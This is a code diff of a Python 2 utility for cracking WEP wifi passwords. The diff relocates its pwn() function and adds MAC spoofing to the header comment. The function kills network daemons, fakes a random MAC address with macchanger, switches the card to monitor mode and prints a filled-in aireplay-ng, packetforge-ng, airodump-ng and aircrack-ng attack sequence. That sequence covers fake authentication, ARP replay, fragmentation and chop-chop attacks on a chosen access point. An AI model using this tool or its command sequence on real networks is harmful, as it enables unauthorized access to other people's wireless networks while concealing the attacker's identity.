@@ -10,10 +10,10 @@
 #
 # This utility terminates disruptive daemons, scans for networks,
 # places your wifi card into monitor mode, switches to the right channel,
-# and builds a "choose your own adventure" instruction sequence for the
-# particular access point you choose to crack, for use with aircrack-ng
-# for cracking WEP passwords, and finally resets your daemons once you've
-# found a password.
+# fakes a random MAC address, and builds a "choose your own adventure"
+# instruction sequence for the particular access point you choose to
+# crack, for use with aircrack-ng for cracking WEP passwords, and finally
+# resets your daemons once you've found a password.
 #
 # Be sure to look at the pwn() function. There are /etc/init.d/ commands in
 # there to shutdown and startup your system's networking services. Here you
@@ -29,6 +29,88 @@
 import sys
 import subprocess
 import os
+
+def pwn(interface, network):
+	print "[+] Shutting down services"
+
+	# BEGIN CHANGE ME
+	os.system("/etc/init.d/wpa_supplicant stop")
+	os.system("/etc/init.d/dhcpcd stop")
+	os.system("/etc/init.d/avahi-daemon stop")
+	# END CHANGE ME
+
+	print "[+] Acquiring MAC address:",
+	f = open("/sys/class/net/%s/address" % interface, "r")
+	realMac = f.read().strip().upper()
+	f.close()
+	print realMac
+
+	print "[+] Setting fake MAC address"
+	os.system("ifconfig %s down" % interface)
+	os.system("macchanger -r %s" % interface)
+	f = open("/sys/class/net/%s/address" % interface, "r")
+	mac = f.read().strip().upper()
+	f.close()
+
+	print "[+] Setting wireless card to channel %s" % network["Channel"]
+	os.system("iwconfig %s mode managed" % interface)
+	os.system("ifconfig %s up" % interface)
+	os.system("iwconfig %s channel %s" % (interface, network["Channel"]))
+	os.system("ifconfig %s down" % interface)
+	os.system("iwconfig %s mode monitor" % interface)
+	os.system("ifconfig %s up" % interface)
+	os.system("iwconfig %s" % interface)
+	
+	instructions = """
+== Get Deauthetication Packets (Fake Authentication) ==
+aireplay-ng -1 0 -e NAME -a BSSID -h MAC INTERFACE
+OR
+aireplay-ng -1 6000 -o 1 -q 10 -e NAME -a BSSID -h MAC INTERFACE
+
+== Request ARP Packets ==
+aireplay-ng -3 -b BSSID -h MAC INTERFACE
+* if successful move to capture IVs
+
+== Fragmentation Attack (if requesting ARPs didn't work - no users on network) ==
+aireplay-ng -5 -b BSSID -h MAC INTERFACE
+* use this packet? yes
+
+== Chop-Chop Attach (if fragmentation fails) ==
+aireplay-ng -4 -b BSSID -h MAC INTERFACE
+* use this packet? yes
+
+== Construct ARP Packet ==
+packetforge-ng -0 -a BSSID -h MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request
+* k source, l destination - change for persnikittiness
+
+== Capture IVs ==
+airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE
+
+== Inject Constructed ARP (if fragmentation or chop-chop) ==
+aireplay-ng -2 -r arp-request INTERFACE
+* use this packet? yes
+
+== Analyze ==
+aircrack-ng -z -b BSSID output*.cap
+"""
+
+	instructions = instructions.replace("NAME", network["Name"]).replace("BSSID", network["Address"]).replace("MAC", mac).replace("INTERFACE", interface).replace("CHANNEL", network["Channel"])
+	proc = subprocess.Popen("less", stdin=subprocess.PIPE)
+	proc.communicate(input=instructions)
+	proc.wait()
+	
+	print "[+] Restoring wifi card"
+	os.system("ifconfig %s down" % interface)
+	os.system("macchanger -m %s %s" % (realMac, interface))
+	os.system("iwconfig %s mode managed" % interface)
+	os.system("ifconfig %s up" % interface)
+
+	print "[+] Starting stopped services"
+	# BEGIN CHANGE ME
+	os.system("/etc/init.d/wpa_supplicant start")
+	os.system("/etc/init.d/dhcpcd start")
+	os.system("/etc/init.d/avahi-daemon start")
+	# END CHANGE ME
 
 def get_name(cell):
 	return matching_line(cell, "ESSID:")[1:-1]
@@ -122,84 +204,6 @@ def print_cells(cells):
 		table.append(cell_properties)
 		counter += 1
 	print_table(table)
-
-def pwn(interface, network):
-	print "[+] Shutting down services"
-
-	# BEGIN CHANGE ME
-	os.system("/etc/init.d/wpa_supplicant stop")
-	os.system("/etc/init.d/dhcpcd stop")
-	os.system("/etc/init.d/avahi-daemon stop")
-	# END CHANGE ME
-	print "[+] Acquiring MAC address:",
-	f = open("/sys/class/net/%s/address" % interface, "r")
-	realMac = f.read().strip().upper()
-	f.close()
-	print realMac
-	print "[+] Setting fake MAC address"
-	os.system("ifconfig %s down" % interface)
-	os.system("macchanger -r %s" % interface)
-	f = open("/sys/class/net/%s/address" % interface, "r")
-	mac = f.read().strip().upper()
-	f.close()
-	print "[+] Setting wireless card to channel %s" % network["Channel"]
-	os.system("iwconfig %s mode managed" % interface)
-	os.system("ifconfig %s up" % interface)
-	os.system("iwconfig %s channel %s" % (interface, network["Channel"]))
-	os.system("ifconfig %s down" % interface)
-	os.system("iwconfig %s mode monitor" % interface)
-	os.system("ifconfig %s up" % interface)
-	os.system("iwconfig %s" % interface)
-	
-	instructions = """
-== Get Deauthetication Packets (Fake Authentication) ==
-aireplay-ng -1 0 -e NAME -a BSSID -h MAC INTERFACE
-OR
-aireplay-ng -1 6000 -o 1 -q 10 -e NAME -a BSSID -h MAC INTERFACE
-
-== Request ARP Packets ==
-aireplay-ng -3 -b BSSID -h MAC INTERFACE
-* if successful move to capture IVs
-
-== Fragmentation Attack (if requesting ARPs didn't work - no users on network) ==
-aireplay-ng -5 -b BSSID -h MAC INTERFACE
-* use this packet? yes
-
-== Chop-Chop Attach (if fragmentation fails) ==
-aireplay-ng -4 -b BSSID -h MAC INTERFACE
-* use this packet? yes
-
-== Construct ARP Packet ==
-packetforge-ng -0 -a BSSID -h MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request
-* k source, l destination - change for persnikittiness
-
-== Capture IVs ==
-airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE
-
-== Inject Constructed ARP (if fragmentation or chop-chop) ==
-aireplay-ng -2 -r arp-request INTERFACE
-* use this packet? yes
-
-== Analyze ==
-aircrack-ng -z -b BSSID output*.cap
-"""
-
-	instructions = instructions.replace("NAME", network["Name"]).replace("BSSID", network["Address"]).replace("MAC", mac).replace("INTERFACE", interface).replace("CHANNEL", network["Channel"])
-	proc = subprocess.Popen("less", stdin=subprocess.PIPE)
-	proc.communicate(input=instructions)
-	proc.wait()
-	
-	print "[+] Restoring wifi card"
-	os.system("ifconfig %s down" % interface)
-	os.system("macchanger -m %s %s" % (realMac, interface))
-	os.system("iwconfig %s mode managed" % interface)
-	os.system("ifconfig %s up" % interface)
-	print "[+] Starting stopped services"
-	# BEGIN CHANGE ME
-	os.system("/etc/init.d/wpa_supplicant start")
-	os.system("/etc/init.d/dhcpcd start")
-	os.system("/etc/init.d/avahi-daemon start")
-	# END CHANGE ME
 
 def main():
 	print "+------------------------+"
